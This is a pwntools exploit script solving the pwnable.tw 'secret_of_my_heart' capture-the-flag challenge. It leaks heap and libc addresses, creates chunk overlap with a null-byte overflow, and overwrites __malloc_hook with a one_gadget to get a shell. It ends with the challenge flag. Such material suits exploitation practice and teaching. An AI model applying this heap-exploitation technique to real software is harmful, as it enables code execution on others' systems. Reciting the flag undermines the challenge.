from pwn import *

elf = ELF("secret_of_my_heart")
libc = ELF("libc_64.so.6")
p = remote("chall.pwnable.tw", 10302)


def add(size: int, name, secret):
    p.recvuntil(b"Your choice :")
    p.sendline(b"1")
    p.recvuntil(b"Size of heart : ")
    p.sendline(str(size).encode())
    p.recvuntil(b"Name of heart :")
    p.send(name)
    p.recvuntil(b"secret of my heart :")
    p.send(secret)


def show(idx: int):
    p.recvuntil(b"Your choice :")
    p.sendline(b"2")
    p.recvuntil(b"Index :")
    p.sendline(str(idx).encode())


def delete(idx: int):
    p.recvuntil(b"Your choice :")
    p.sendline(b"3")
    p.recvuntil(b"Index :")
    p.sendline(str(idx).encode())


def secret():
    p.recvuntil(b"Your choice :")
    p.sendline(b"4869")


# leak heap && libc
with log.progress("Stage 1: Leaking heap address") as l:
    add(0x10, b"a" * 0x20, b"leak heap")  # 0
    show(0)
    p.recvuntil(b"Name")
    p.recvuntil(b"a" * 0x20)
    heap_leak = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
    heap_base = heap_leak - 0x10
    log.info("heap_leak: %s" % hex(heap_leak))
    l.success(hex(heap_base))

# poison_null_byte && overlapping
with log.progress("Stage 2: Poisoning null byte and overlapping") as l:
    l.status("allocating chunk[1], chunk[2] and chunk[3]")
    add(0x100, b"b" * 0x20, b"A" * (0x100 - 0x10) + p64(0x100) + p64(0x10))  # 1
    add(0x100, b"b" * 0x20, b"B")  # 2
    add(0x18, b"b" * 0x20, b"split")  # 3
    l.status("free chunk[1] and chunk[0]")
    delete(1)
    delete(0)
    l.status("allocating chunks")
    add(0x18, b"b" * 0x20, b"a" * 0x18)  # 0
    add(0x80, b"c" * 0x20, b"\n")  # 1 a1
    add(0x68, b"c" * 0x20, b"\n")  # 4 a2

    l.status("free")
    delete(1)
    delete(2)
    l.success()

with log.progress("Stage 3: Leaking libc") as l:
    add(0x88, b"d" * 0x20, b"\n")  # 1
    show(4)
    p.recvuntil(b"Secret : ")
    libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
    # libc_base = libc_leak - 0x3c4b78
    libc_base = libc_leak - 0x68 - libc.symbols["__malloc_hook"]
    malloc_hook = libc_base + libc.symbols["__malloc_hook"]
    fake_chunk = malloc_hook - 0x23
    one_gadget = libc_base + 0xef6c4
    log.info(f"libc_leak: {hex(libc_leak)}")
    sleep(1)
    log.info(f"malloc_hook: {hex(malloc_hook)}")
    sleep(1)
    log.info(f"fake_chunk: {hex(fake_chunk)}")
    sleep(1)
    l.success(hex(libc_base))

# attack malloc_hook
with log.progress("Stage 4: Overwriting __malloc_hook") as l:
    delete(1)
    add(0xa0, b"e" * 0x20, b"a" * 0x80 + p64(0) + p64(0x71))  # 1
    delete(1)
    delete(4)
    add(0xa0, b"e" * 0x20, b"a" * 0x80 + p64(0) + p64(0x71) + p64(fake_chunk))  # 1
    add(0x68, b"f" * 0x20, b"tmp")
    add(0x68, b"f" * 0x20, b"a" * 0x13 + p64(one_gadget))
    l.status("triggering malloc_hook")
    delete(4)
    l.success()
    p.interactive()

# FLAG --> FLAG{It_just_4_s3cr3t_on_the_h34p}
